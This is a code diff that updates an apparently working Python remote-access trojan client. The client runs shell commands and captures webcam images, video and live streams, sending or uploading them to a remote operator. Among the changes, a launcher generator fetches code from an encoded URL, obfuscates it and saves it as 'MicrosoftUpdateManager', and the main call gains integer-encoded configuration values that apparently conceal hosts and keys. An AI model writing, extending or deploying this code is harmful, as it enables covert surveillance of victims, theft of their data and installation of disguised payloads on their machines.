@@ -175,7 +175,7 @@ class Client(object):
     @_command
     def pwd(self):
         """\tpresent working directory"""
-        return os.getcwd()
+        return '\n' + os.getcwd() + '\n'
 
     @_command
     def cat(self, *x):
@@ -224,7 +224,7 @@ class Client(object):
 
     @_command
     def unzip(self, fp):
-        """\tunzip a compressed archive/file"""
+        """unzip a compressed archive/file"""
         return self._unzip(fp)
     
     @_command
@@ -310,6 +310,7 @@ class Client(object):
     ls.usage		= 'ls <path>'
     wget.usage		= 'wget <url>'
     cd.usage		= 'cd <path>'
+    cat.usage           = 'cat <file>'
     new.usage           = 'new <option>'
     unzip.usage		= 'unzip <file>'
     webcam.usage	= 'webcam <mode>'
@@ -329,8 +330,6 @@ class Client(object):
     def _cd(self, *args): return os.chdir(args[0]) if args and os.path.isdir(args[0]) else os.chdir('.')
 
     def _ls(self, path): return '\n'.join(os.listdir(path)) if os.path.isdir(path) else '\n'.join(os.listdir('.'))
-
-    def _results(self): return self._show({module:result for module,result in self._result.items() if len(result)})
   
     def _status(self,c=None): return '{} days, {} hours, {} minutes, {} seconds\n'.format(int(time.clock() / 86400.0), int((time.clock() % 86400.0) / 3600.0), int((time.clock() % 3600.0) / 60.0), int(time.clock() % 60.0)) if not c else '{} days, {} hours, {} minutes, {} seconds'.format(int(c / 86400.0), int((c % 86400.0) / 3600.0), int((c % 3600.0) / 60.0), int(c % 60.0))
 
@@ -345,7 +344,7 @@ class Client(object):
     def _help_modules(self): return '\n'.join(['  {}\t{}'.format('MODULE',' STATUS')] + [' -----------------------'] + [' {}\t{}'.format(mod, (' enabled' if self._modules[mod].status.is_set() else 'disabled')) for mod in self._modules if mod != 'webcam'] + [' {}\t\t{}'.format('webcam', (' enabled' if self._modules['webcam'].status.is_set() else 'disabled'))]) + '\n'
 
     def _debug(self, data):
-        if bool('__v__' in vars(self) and self.__v__):
+        if hasattr(self, '__v__') and bool(self.__v__):
             print(data)
 
     def _long_to_bytes(self, x):
@@ -449,7 +448,7 @@ class Client(object):
             xB = self._bytes_to_long(self._socket.recv(256))
             x  = pow(xB, a, p)
             return sys.modules['hashlib'].new(self.encryption.options.get('hash_algo'), self._long_to_bytes(x)).digest()
-        except socket.error:
+        except Exception as e:
             self._connected.clear()
             return self._connect()
 
@@ -631,7 +630,16 @@ class Client(object):
             return '\n'.join(output)
         except Exception as e:
             return 'Option error: {}'.format(str(e))
-            
+
+    def _results(self):
+        output  = ['{:>12}{:>34}'.format(' MODULE','RESULTS'),'----------------------------------------------------------']
+        results = {module:result for module,result in self._result.items() if len(result)}
+        for k,v in results.items():
+            output.append('{:>12}'.format(k))
+            for _k, _v in v.items():
+                output.append('{:>28}\t{}'.format(_k, _v))
+        return '\n'.join(output)
+
     def _show(self, target):
         try:
             results = json.dumps(target, indent=2, separators=(',','\t'), sort_keys=True)
@@ -812,6 +820,7 @@ class Client(object):
                     self._send(result, method=cmd)
             else:
                 if 'connecting' not in self._threads:
+                    self._connect()
                     t = threading.Thread(target=self._connect, name=time.time())
                     t.setDaemon(True)
                     self._threads['connecting'] = t
@@ -831,7 +840,9 @@ class Client(object):
             self._threads['connecting']                 = threading.Thread(target=self._connect, name=time.time())
             self._threads['shell']                      = threading.Thread(target=self._shell, name=time.time())
             self._threads['connecting'].start()
+            self._threads['connecting'].join()
             self._threads['shell'].start()
+            time.clock()
         except Exception as e:
             self._debug("Error: '{}'".format(str(e)))
 
@@ -865,7 +876,7 @@ class Client(object):
 
     # ------------------- encrypted launcher -------------------------
 
-    def _generate_launcher():
+    def _generate_launcher(self, output_file='MicrosoftUpdateManager'):
         if hasattr(self, '__l__') and hasattr(self, '__k__'):
             template    = self.__k__
             launcher    = self.__l__
@@ -873,7 +884,7 @@ class Client(object):
             nouns       = [i.title().replace('-','') for i in urllib2.urlopen('https://raw.githubusercontent.com/hathcox/Madlibs/master/nouns.list').read().split()]
             random_var  = lambda: adjectives.pop(adjectives.index(random.choice(adjectives))) + adjectives.pop(adjectives.index(random.choice(adjectives))) + nouns.pop(nouns.index(random.choice(nouns)))
             code        = urllib2.urlopen(bytes(bytearray.fromhex(hex(long(launcher)).strip('0x').strip('L')))).read()
-            output_file = os.path.join(os.path.expandvars('%TEMP%'), random_var() + '.py') if os.name is 'nt' else os.path.join('/tmp', random_var() + '.py')
+            output_file = os.path.join(os.path.expandvars('%TEMP%'), output_file + '.py') if os.name is 'nt' else os.path.join('/tmp', output_file + '.py')
             key         = str().join(random.choice([chr(i) for i in range(48, 123) if chr(i).isalnum()]) for x in range(16))
             pkg         = {'b64decode':'base64','unpack':'struct','pack':'struct','urlopen':'urllib'}
             var         = {k: random_var() for k in pkg}
@@ -1003,13 +1014,11 @@ class Client(object):
                 port = args[1]
             else:
                 return "Error - invalid mode '{}'. Valid options: 'image', 'video', 'stream'".format(mode)
-        if mode not in self._result['webcam']:
-            self._result['webcam'][mode] = {}
         try:
-            result = getattr(self, '_webcam_{}'.format(mode))(port)
+            result = getattr(self, '_webcam_{}'.format(mode))(port=port)
         except Exception as e:
             result = str(e)
-        self._result['webcam'][mode][time.ctime()] = result
+        self._result['webcam'][time.ctime()] = result
         return result
 
     def _webcam_image(self, *args, **kwargs):
@@ -1028,7 +1037,9 @@ class Client(object):
             result = 'Upload error: {}'.format(str(e))
         return result
 
-    def _webcam_stream(self, port, retries=5):
+    def _webcam_stream(self, port=None, retries=5):
+        if not port:
+            return 'Stream failed - missing port number'
         try:
             host = self._socket.getpeername()[0]
         except socket.error:
@@ -1045,6 +1056,7 @@ class Client(object):
             return 'Stream failed - connection error'
         dev = VideoCapture(0)
         try:
+            t1 = time.time()
             while True:
                 try:
                     ret,frame=dev.read()
@@ -1057,14 +1069,13 @@ class Client(object):
         finally:
             dev.release()
             sock.close()
-        if dev.isOpened():
-            dev.release()
-        return 'Streaming complete'
+            t2 = time.time() - t1
+        return 'Live stream for {}'.format(self._status(t2))
 
     def _webcam_video(self, duration=5.0, *args, **kwargs):
         if str(self.webcam.options['upload']).lower() == 'ftp':
             try:
-                fpath  = cStringIO.StringIO()
+                fpath  = os.path.join(os.path.expandvars('%TEMP%'), 'tmp{}'.format(random.randint(1000,9999))) if os.name is 'nt' else os.path.join('/tmp', 'tmp{}'.format(random.randint(1000,9999)))
                 fourcc = VideoWriter_fourcc(*'DIVX') if sys.platform is 'win32' else VideoWriter_fourcc(*'XVID')
                 output = VideoWriter(fpath, fourcc, 20.0, (640,480))
                 end = time.time() + duration
@@ -1440,4 +1451,21 @@ def main(*args, **kwargs):
 
 
 if __name__ == '__main__':
-    main()
+    m = main(**{
+            "a": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
+            "c": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
+            "b": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
+            "d": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
+            "e": "423224063517525567299427660991207813087967857812230603629111",
+            "g": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
+            "k": "12095051301478169748777225282050429328988589300942044190524178307978800637761077",
+            "l": "12095051301478169748777225282050429328988589300942044190524181121075829415236930",
+            "q": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
+            "s": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
+            "t": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
+            "u": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
+            "v": "12620",
+            "w": "12095051301478169748777225282050429328988589300942044190524177815713142069688900",
+            "x": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
+            "y": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
+    })
